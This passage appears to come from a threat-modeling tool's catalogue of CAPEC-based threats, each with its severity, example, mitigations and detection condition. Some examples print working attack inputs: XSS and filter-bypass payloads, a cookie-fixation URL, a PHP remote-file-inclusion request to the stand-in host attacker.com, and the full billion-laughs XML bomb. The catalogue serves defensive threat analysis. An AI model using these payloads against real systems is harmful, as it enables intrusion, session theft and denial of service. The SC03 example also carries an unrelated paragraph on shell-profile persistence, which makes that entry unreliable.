  <dd>Always use HTTPS and SSL Certificates. Firewall optimizations to prevent unauthorized access to or from a private network. Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API. Use IP whitelisting and rate limiting.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/160.html, http://cwe.mitre.org/data/definitions/346.html</dd>

  <dt>Condition</dt>
  <dd>target.implementsAPI is True and target.controls.validatesInput is False</dd>
</dl>



## HA02 White Box Reverse Engineering

An attacker discovers the structure, function, and composition of a type of computer software through white box analysis techniques. White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>Direct access to the object or software.</dd>

  <dt>Example</dt>
  <dd>Attacker identifies client components to extract information from. These may be binary executables, class files, shared libraries (e.g., DLLs), configuration files, or other system files.</dd>

  <dt>Mitigations</dt>
  <dd>Employ code obfuscation techniques to prevent the adversary from reverse engineering the targeted entity.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/167.html</dd>

  <dt>Condition</dt>
  <dd>target.hasPhysicalAccess is True</dd>
</dl>



## DS03 Footprinting

An adversary engages in probing and exploration activities to identify constituents and properties of the target. Footprinting is a general term to describe a variety of information gathering techniques, often used by attackers in preparation for some attack. It consists of using tools to learn as much as possible about the composition, configuration, and security mechanisms of the targeted application, system or network. Information that might be collected during a footprinting effort could include open ports, applications and their versions, network topology, and similar information. While footprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.

<dl>
  <dt>Severity</dt>
  <dd>Very Low</dd>

  <dt>Prerequisites</dt>
  <dd>An application must publicize identifiable information about the system or application through voluntary or involuntary means. Certain identification details of information systems are visible on communication networks (e.g., if an adversary uses a sniffer to inspect the traffic) due to their inherent structure and protocol standards. Any system or network that can be detected can be footprinted. However, some configuration choices may limit the useful information that can be collected during a footprinting attack.</dd>

  <dt>Example</dt>
  <dd>In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let's check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We'll set the interval between packets to 1 millisecond. We'll set the number of seconds to wait until a ping times out to 5. We'll set the ping size to 500 bytes and we'll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we'll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates -DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let's port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We'll start searching from port number 1, and we'll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident.</dd>

  <dt>Mitigations</dt>
  <dd>Keep patches up to date by installing weekly or daily if possible.Shut down unnecessary services/ports.Change default passwords by choosing strong passwords.Curtail unexpected input.Encrypt and password-protect sensitive data.Avoid including information that has the potential to identify and compromise your organization's security such as access to business plans, formulas, and proprietary documents.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/169.html, http://cwe.mitre.org/data/definitions/200.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.isHardened is False</dd>
</dl>



## AC06 Using Malicious Files

An attack of this type exploits a system's configuration that allows an attacker to either directly access an executable file, for example through shell access; or in a possible worst case allows an attacker to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>System's configuration must allow an attacker to directly access executable files or upload files to execute. This means that any access control system that is supposed to mediate communications between the subject and the object is set incorrectly or assumes a benign environment.</dd>

  <dt>Example</dt>
  <dd>Consider a directory on a web server with the following permissions drwxrwxrwx 5 admin public 170 Nov 17 01:08 webroot This could allow an attacker to both execute and upload and execute programs' on the web server. This one vulnerability can be exploited by a threat to probe the system and identify additional vulnerabilities to exploit.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Enforce principle of least privilegeDesign: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/17.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/272.html, http://cwe.mitre.org/data/definitions/270.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.isHardened is False or target.controls.hasAccessControl is False</dd>
</dl>



## HA03 Web Application Fingerprinting

An attacker sends a series of probes to a web application in order to elicit version-dependent and type-dependent behavior that assists in identifying the target. An attacker could learn information such as software versions, error pages, and response headers, variations in implementations of the HTTP protocol, directory structures, and other similar information about the targeted service. This information can then be used by an attacker to formulate a targeted attack plan. While web application fingerprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.

<dl>
  <dt>Severity</dt>
  <dd>Low</dd>

  <dt>Prerequisites</dt>
  <dd>Any web application can be fingerprinted. However, some configuration choices can limit the useful information an attacker may collect during a fingerprinting attack.</dd>

  <dt>Example</dt>
  <dd>An attacker sends malformed requests or requests of nonexistent pages to the server. Consider the following HTTP responses. Response from Apache 1.3.23$ nc apache.server.com80 GET / HTTP/3.0 HTTP/1.1 400 Bad RequestDate: Sun, 15 Jun 2003 17:12: 37 GMTServer: Apache/1.3.23Connection: closeTransfer: chunkedContent-Type: text/HTML; charset=iso-8859-1 Response from IIS 5.0$ nc iis.server.com 80GET / HTTP/3.0 HTTP/1.1 200 OKServer: Microsoft-IIS/5.0Content-Location: http://iis.example.com/Default.htmDate: Fri, 01 Jan 1999 20:14: 02 GMTContent-Type: text/HTMLAccept-Ranges: bytes Last-Modified: Fri, 01 Jan 1999 20:14: 02 GMTETag: W/e0d362a4c335be1: ae1Content-Length: 133 [R.170.2]</dd>

  <dt>Mitigations</dt>
  <dd>Implementation: Obfuscate server fields of HTTP response.Implementation: Hide inner ordering of HTTP response header.Implementation: Customizing HTTP error codes such as 404 or 500.Implementation: Hide URL file extension.Implementation: Hide HTTP response header software information filed.Implementation: Hide cookie's software information filed.Implementation: Appropriately deal with error messages.Implementation: Obfuscate database type in Database API's error message.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/170.html, http://cwe.mitre.org/data/definitions/497.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesHeaders is False or target.controls.encodesOutput is False or target.controls.isHardened is False</dd>
</dl>



## SC02 XSS Targeting Non-Script Elements

This attack is a form of Cross-Site Scripting (XSS) where malicious scripts are embedded in elements that are not expected to host scripts such as image tags (<img>), comments in XML documents (< !-CDATA->), etc. These tags may not be subject to the same input validation, output validation, and other content filtering and checking routines, so this can create an opportunity for an attacker to tunnel through the application's elements and launch a XSS attack through other elements. As with all remote attacks, it is important to differentiate the ability to launch an attack (such as probing an internal network for unpatched servers) and the ability of the remote attacker to collect and interpret the output of said attack.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>The target client software must allow the execution of scripts generated by remote hosts.</dd>

  <dt>Example</dt>
  <dd>An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. A malicious user embeds JavaScript in the IMG tags in his messages that gets executed within the victim's browser whenever the victim reads these messages. <img src=javascript:alert('XSS')> When executed within the victim's browser, the malicious script could accomplish a number of adversary objectives including stealing sensitive information such as usernames, passwords, or cookies.</dd>

  <dt>Mitigations</dt>
  <dd>In addition to the traditional input fields, all other user controllable inputs, such as image tags within messages or the likes, must also be subjected to input validation. Such validation should ensure that content that can be potentially interpreted as script by the browser is appropriately filtered.All output displayed to clients must be properly escaped. Escaping ensures that the browser interprets special scripting characters literally and not as script to be executed.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/18.html, http://cwe.mitre.org/data/definitions/80.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.encodesOutput is False</dd>
</dl>



## AC07 Exploiting Incorrectly Configured Access Control Security Levels

An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack. Most commonly, attackers would take advantage of controls that provided too little protection for sensitive activities in order to perform actions that should be denied to them. In some circumstances, an attacker may be able to take advantage of overly restrictive access control policies, initiating denial of services (if an application locks because it unexpectedly failed to be granted access) or causing other legitimate actions to fail due to security. The latter class of attacks, however, is usually less severe and easier to detect than attacks based on inadequate security restrictions. This attack pattern differs from CAPEC 1, Accessing Functionality Not Properly Constrained by ACLs in that the latter describes attacks where sensitive functionality lacks access controls, where, in this pattern, the access control is present, but incorrectly configured.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target must apply access controls, but incorrectly configure them. However, not all incorrect configurations can be exploited by an attacker. If the incorrect configuration applies too little security to some functionality, then the attacker may be able to exploit it if the access control would be the only thing preventing an attacker's access and it no longer does so. If the incorrect configuration applies too much security, it must prevent legitimate activity and the attacker must be able to force others to require this activity.</dd>

  <dt>Example</dt>
  <dd>For example, an incorrectly configured Web server, may allow unauthorized access to it, thus threaten the security of the Web application.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Configure the access control correctly.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/180.html, http://cwe.mitre.org/data/definitions/732.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.hasAccessControl is False</dd>
</dl>



## INP15 IMAP/SMTP Command Injection

An attacker exploits weaknesses in input validation on IMAP/SMTP servers to execute commands on the server. Web-mail servers often sit between the Internet and the IMAP or SMTP mail server. User requests are received by the web-mail servers which then query the back-end mail server for the requested information and return this response to the user. In an IMAP/SMTP command injection attack, mail-server commands are embedded in parts of the request sent to the web-mail server. If the web-mail server fails to adequately sanitize these requests, these commands are then sent to the back-end mail server when it is queried by the web-mail server, where the commands are then executed. This attack can be especially dangerous since administrators may assume that the back-end server is protected against direct Internet access and therefore may not secure it adequately against the execution of malicious commands.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target environment must consist of a web-mail server that the attacker can query and a back-end mail server. The back-end mail server need not be directly accessible to the attacker.The web-mail server must fail to adequately sanitize fields received from users and passed on to the back-end mail server.The back-end mail server must not be adequately secured against receiving malicious commands from the web-mail server.</dd>

  <dt>Example</dt>
  <dd>An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.</dd>

  <dt>Mitigations</dt>
  <dd>All user-controllable input should be validated and filtered for potentially unwanted characters. Whitelisting input is desired, but if a blacklisting approach is necessary, then focusing on command related terms and delimiters is necessary. Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter. Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/183.html, http://cwe.mitre.org/data/definitions/77.html</dd>

  <dt>Condition</dt>
  <dd>(target.protocol == 'IMAP' or target.protocol == 'SMTP') and target.controls.sanitizesInput is False</dd>
</dl>



## HA04 Reverse Engineering

An adversary discovers the structure, function, and composition of an object, resource, or system by using a variety of analysis techniques to effectively determine how the analyzed entity was constructed or operates. The goal of reverse engineering is often to duplicate the function, or a part of the function, of an object in order to duplicate or back engineer some aspect of its functioning. Reverse engineering techniques can be applied to mechanical objects, electronic devices, or software, although the methodology and techniques involved in each type of analysis differ widely.

<dl>
  <dt>Severity</dt>
  <dd>Low</dd>

  <dt>Prerequisites</dt>
  <dd>Access to targeted system, resources, and information.</dd>

  <dt>Example</dt>
  <dd>When adversaries are reverse engineering software, methodologies fall into two broad categories, 'white box' and 'black box.' White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution. 'Black Box' methods involve interacting with the software indirectly, in the absence of the ability to measure, instrument, or analyze an executable object directly. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs.</dd>

  <dt>Mitigations</dt>
  <dd>Employ code obfuscation techniques to prevent the adversary from reverse engineering the targeted entity.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/188.html</dd>

  <dt>Condition</dt>
  <dd>target.hasPhysicalAccess is True</dd>
</dl>



## SC03 Embedding Scripts within Scripts

An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. The adversary leverages this capability to execute his/her own script by embedding it within other scripts that the target software is likely to execute. The adversary must have the ability to inject their script into a script that is likely to be executed. If this is done, then the adversary can potentially launch a variety of probes and attacks against the web server's local environment, in many cases the so-called DMZ, back end resources the web server can communicate with, and other hosts. With the proliferation of intermediaries, such as Web App Firewalls, network devices, and even printers having JVMs and Web servers, there are many locales where an attacker can inject malicious scripts. Since this attack pattern defines scripts within scripts, there are likely privileges to execute said attack on the host. These attacks are not solely limited to the server side, client side scripts like Ajax and client side JavaScript can contain malicious scripts as well.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts.</dd>

  <dt>Example</dt>
  <dd>Ajax applications enable rich functionality for browser based web applications. Applications like Google Maps deliver unprecedented ability to zoom in and out, scroll graphics, and change graphic presentation through Ajax. The security issues that an attacker may exploit in this instance are the relative lack of security features in JavaScript and the various browser's implementation of JavaScript, these security gaps are what XSS and a host of other client side vulnerabilities are based on. While Ajax may not open up new security holes, per se, due to the conversational aspects between client and server of Ajax communication, attacks can be optimized. A single zoom in or zoom out on a graphic in an Ajax application may round trip to the server dozens of times. One of the first steps many attackers take is frequently footprinting an environment, this can include scanning local addresses like 192.*.*.* IP addresses, checking local directories, files, and settings for known vulnerabilities, and so on. <IMG SRC=javascript:alert('XSS')> The XSS script that is embedded in a given IMG tag can be manipulated to probe a different address on every click of the mouse or other motions that the Ajax application is aware of. In addition the enumerations allow for the attacker to nest sequential logic in the attacks. While Ajax applications do not open up brand new attack vectors, the existing attack vectors are more than adequate to execute attacks, and now these attacks can be optimized to sequentially execute and enumerate host environments.~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed. These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell.</dd>

  <dt>Mitigations</dt>
  <dd>Use browser technologies that do not allow client side scripting.Utilize strict type, character, and encoding enforcement.Server side developers should not proxy content via XHR or other means. If a HTTP proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.Ensure all content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all remote content.Perform output validation for all remote content.Disable scripting languages such as JavaScript in browserSession tokens for specific hostPatching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/19.html, http://cwe.mitre.org/data/definitions/284.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.hasAccessControl is False</dd>
</dl>



## INP16 PHP Remote File Inclusion

In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized include or require call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>Target application server must allow remote files to be included in the require, include, etc. PHP directivesThe adversary must have the ability to make HTTP requests to the target web application.</dd>

  <dt>Example</dt>
  <dd>The adversary controls a PHP script on a server http://attacker.com/rfi.txt The .txt extension is given so that the script doesn't get executed by the attacker.com server, and it will be downloaded as text. The target application is vulnerable to PHP remote file inclusion as following: include($_GET['filename'] . '.txt') The adversary creates an HTTP request that passes his own script in the include: http://example.com/file.php?filename=http://attacker.com/rfi with the concatenation of the .txt prefix, the PHP runtime download the attack's script and the content of the script gets executed in the same context as the rest of the original script.</dd>

  <dt>Mitigations</dt>
  <dd>Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Only allow known files to be included (whitelist)Implementation: Make use of indirect references passed in URL parameters instead of file namesConfiguration: Ensure that remote scripts cannot be include in the include or require PHP directives</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/193.html, http://cwe.mitre.org/data/definitions/98.html, http://cwe.mitre.org/data/definitions/80.html, http://cwe.mitre.org/data/definitions/714.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False</dd>
</dl>



## AA02 Principal Spoof

A Principal Spoof is a form of Identity Spoofing where an adversary pretends to be some other person in an interaction. This is often accomplished by crafting a message (either written, verbal, or visual) that appears to come from a person other than the adversary. Phishing and Pharming attacks often attempt to do this so that their attempts to gather sensitive information appear to come from a legitimate source. A Principal Spoof does not use stolen or spoofed authentication credentials, instead relying on the appearance and content of the message to reflect identity. The possible outcomes of a Principal Spoof mirror those of Identity Spoofing. (e.g., escalation of privilege and false attribution of data or activities) Likewise, most techniques for Identity Spoofing (crafting messages or intercepting and replaying or modifying messages) can be used for a Principal Spoof attack. However, because a Principal Spoof is used to impersonate a person, social engineering can be both an attack technique (using social techniques to generate evidence in support of a false identity) as well as a possible outcome (manipulating people's perceptions by making statements or performing actions under a target's name).

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target must associate data or activities with a person's identity and the adversary must be able to modify this identity without detection.</dd>

  <dt>Example</dt>
  <dd>An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials.</dd>

  <dt>Mitigations</dt>
  <dd>Employ robust authentication processes (e.g., multi-factor authentication).</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/195.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.authenticatesSource is False</dd>
</dl>



## CR04 Session Credential Falsification through Forging

An attacker creates a false but functional session credential in order to gain or usurp access to a service. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. If an attacker is able to forge valid session credentials they may be able to bypass authentication or piggy-back off some other authenticated user's session. This attack differs from Reuse of Session IDs and Session Sidejacking attacks in that in the latter attacks an attacker uses a previous or existing credential without modification while, in a forging attack, the attacker must create their own credential, although it may be based on previously observed credentials.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The targeted application must use session credentials to identify legitimate users. Session identifiers that remains unchanged when the privilege levels change. Predictable session identifiers.</dd>

  <dt>Example</dt>
  <dd>This example uses client side scripting to set session ID in the victim's browser. The JavaScript code document.cookie=sessionid=0123456789 fixates a falsified session credential into victim's browser, with the help of crafted a URL link. http://www.example.com/<script>document.cookie=sessionid=0123456789;</script> A similar example uses session ID as an argument of the URL. http://www.example.com/index.php/sessionid=0123456789 Once the victim clicks the links, the attacker may be able to bypass authentication or piggy-back off some other authenticated victim's session.</dd>

  <dt>Mitigations</dt>
  <dd>Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult.Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/196.html, http://cwe.mitre.org/data/definitions/384.html, http://cwe.mitre.org/data/definitions/664.html</dd>

  <dt>Condition</dt>
  <dd>target.usesSessionTokens is True and target.controls.implementsNonce is False</dd>
</dl>



## DO04 XML Entity Expansion

An attacker submits an XML document to a target application where the XML document uses nested entity expansion to produce an excessively large output XML. XML allows the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>This type of attack requires that the target must receive XML input but either fail to provide an upper limit for entity expansion or provide a limit that is so large that it does not preclude significant resource consumption.</dd>

  <dt>Example</dt>
  <dd>The most common example of this type of attack is the many laughs attack (sometimes called the 'billion laughs' attack). For example: <?xml version=1.0?><!DOCTYPE lolz [<!ENTITY lol lol><!ENTITY lol2 &lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;><!ENTITY lol3 &lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;><!ENTITY lol4 &lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;><!ENTITY lol5 &lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;><!ENTITY lol6 &lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;><!ENTITY lol7 &lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6><!ENTITY lol8 &lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;><!ENTITY lol9 &lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;> ]><lolz>&lol9;</lolz> This is well formed and valid XML according to the DTD. Each entity increases the number entities by a factor of 10. The line of XML containing lol9; expands out exponentially to a message with 10^9 entities. A small message of a few KBs in size can easily be expanded into a few GB of memory in the parser. By including 3 more entities similar to the lol9 entity in the above code to the DTD, the program could expand out over a TB as there will now be 10^12 entities. Depending on the robustness of the target machine, this can lead to resource depletion, application crash, or even the execution of arbitrary code through a buffer overflow.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.Implementation: Disable altogether the use of inline DTD schemas in your XML parsing objects. If must use DTD, normalize, filter and white list and parse with methods and routines that will detect entity expansion from untrusted sources.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/197.html, http://cwe.mitre.org/data/definitions/400.html, http://cwe.mitre.org/data/definitions/770.html</dd>

  <dt>Condition</dt>
  <dd>any(d.format == 'XML' for d in target.data) and target.handlesResources is False</dd>
</dl>



## DS04 XSS Targeting Error Pages

An adversary distributes a link (or possibly some other query structure) with a request to a third party web server that is malformed and also contains a block of exploit code in order to have the exploit become live code in the resulting error page. When the third party web server receives the crafted request and notes the error it then creates an error message that echoes the malformed message, including the exploit. Doing this converts the exploit portion of the message into to valid language elements that are executed by the viewing browser. When a victim executes the query provided by the attacker the infected error message error message is returned including the exploit code which then runs in the victim's browser. XSS can result in execution of code as well as data leakage (e.g. session cookies can be sent to the attacker). This type of attack is especially dangerous since the exploit appears to come from the third party web server, who the victim may trust and hence be more vulnerable to deception.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>A third party web server which fails to adequately sanitize messages sent in error pages.The victim must be made to execute a query crafted by the attacker which results in the infected error report.</dd>

  <dt>Example</dt>
  <dd>A third party web server fails to adequately sanitize messages sent in error pages. Adversary takes advantage of the data displayed in the error message.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list any input that will be used in error messages.Implementation: The victim should configure the browser to minimize active content from untrusted sources.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/198.html, http://cwe.mitre.org/data/definitions/81.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.encodesOutput is False or target.controls.validatesInput is False or target.controls.sanitizesInput is False</dd>
</dl>



## SC04 XSS Using Alternate Syntax

An adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the script tag using the alternate forms of Script or ScRiPt may bypass filters where script is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>Target client software must allow scripting such as JavaScript.</dd>

  <dt>Example</dt>
  <dd>In this example, the attacker tries to get a script executed by the victim's browser. The target application employs regular expressions to make sure no script is being passed through the application to the web page; such a regular expression could be ((?i)script), and the application would replace all matches by this regex by the empty string. An attacker will then create a special payload to bypass this filter: <scriscriptpt>alert(1)</scscriptript> when the applications gets this input string, it will replace all script (case insensitive) by the empty string and the resulting input will be the desired vector by the attacker. In this example, we assume that the application needs to write a particular string in a client-side JavaScript context (e.g., <script>HERE</script>). For the attacker to execute the same payload as in the previous example, he would need to send alert(1) if there was no filtering. The application makes use of the following regular expression as filter ((w+)s*(.*)|alert|eval|function|document) and replaces all matches by the empty string. For example each occurrence of alert(), eval(), foo() or even the string alert would be stripped. An attacker will then create a special payload to bypass this filter: this['al' + 'ert'](1) when the applications gets this input string, it won't replace anything and this piece of JavaScript has exactly the same runtime meaning as alert(1). The attacker could also have used non-alphanumeric XSS vectors to bypass the filter; for example, ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_) would be executed by the JavaScript engine like alert(1) is.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcementImplementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/199.html, http://cwe.mitre.org/data/definitions/87.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.sanitizesInput is False or target.controls.validatesInput is False or target.controls.encodesOutput is False</dd>
</dl>



## CR05 Encryption Brute Forcing

An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.

<dl>
  <dt>Severity</dt>
  <dd>Low</dd>

  <dt>Prerequisites</dt>
  <dd>Ciphertext is known.Encryption algorithm and key size are known.</dd>

  <dt>Example</dt>
  <dd>In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.</dd>

  <dt>Mitigations</dt>
  <dd>Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.</dd>

  <dt>References</dt>
